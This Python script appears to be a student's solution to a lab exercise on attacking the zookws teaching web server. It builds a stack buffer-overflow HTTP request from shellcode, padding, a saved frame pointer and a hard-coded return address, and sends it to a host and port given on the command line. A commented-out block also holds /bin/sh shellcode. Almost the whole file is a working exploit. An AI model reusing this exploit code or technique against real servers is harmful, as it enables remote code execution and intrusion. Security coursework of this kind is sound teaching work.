#!/usr/bin/python
import sys
import socket
import traceback
import urllib
import struct

####

## You might find it useful to define variables that store various
## stack or function addresses from the zookd / zookfs processes,
## which you can then use in build_exploit(); the following are just
## examples.

stack_buffer = 0xbfffee08
stack_saved_ebp = 0xbffff618
stack_retaddr = stack_saved_ebp + 4

## This is the function that you should modify to construct an
## HTTP request that will cause a buffer overflow in some part
## of the zookws web server and exploit it.

def build_exploit(shellcode):
    ## Things that you might find useful in constructing your exploit:
    ##   urllib.quote(s)
    ##     returns string s with "special" characters percent-encoded
    ##   struct.pack("<I", x)
    ##     returns the 4-byte binary encoding of the 32-bit integer x
    ##   variables for program addresses (ebp, buffer, retaddr=ebp+4)

    ##req =   "GET / HTTP/1.0\r\n" + \
    ##        "\r\n"
    #p_size = 2064
    #req = "GET /"
    #padding = ""
    #for i in range(1,p_size):
    #    padding += "\x90"    
    #padding EBP
    #padding += "\x90\x90\x90\x90"
    #padding RET
    #padding += "\x90\x70\x60\x50"

    #req += padding

    code = urllib.quote(shellcode)
    #print "shellcod:", len(shellcode),"code:", len(code)
    padding_len =  2068 - len(shellcode) - len("/aaa") - 4
    addr = struct.pack("<I", 0xbfffee08 + 4)
    ebp = struct.pack("<I", stack_saved_ebp)
    #addr = "\x0c\xee\xff\xef"
    
    #ebp = "\x48\xfe\xff\xc6"
#addr = "\xbf\xff\xee\x08"
    req = "GET /aaa" + code + "a" * padding_len + ebp + addr

    req += " HTTP/1.1\r\n"

    req += "\r\n"
    #print "req : ",req
    return req

####

def send_req(host, port, req):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Connecting to %s:%d..." % (host, port))
    sock.connect((host, port))

    print("Connected, sending request...")
    sock.send(req)

    print("Request sent, waiting for reply...")
    rbuf = sock.recv(1024)
    resp = ""
    while len(rbuf):
        resp = resp + rbuf
        rbuf = sock.recv(1024)

    print("Received reply.")
    sock.close()
    return resp

####

if len(sys.argv) != 3:
    print("Usage: " + sys.argv[0] + " host port")
    exit()

try:
    shellfile = open("shellcode.bin", "r")
    shellcode = shellfile.read()
    #shellcode = "\xeb\x1f\x5e\x89\76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \
    #"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \
    #"\x80\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00"
    req = build_exploit(shellcode)
    print("HTTP request:")
    print(req)

    resp = send_req(sys.argv[1], int(sys.argv[2]), req)
    print("HTTP response:")
    print(resp)
except:
    print("Exception:")
    print(traceback.format_exc())

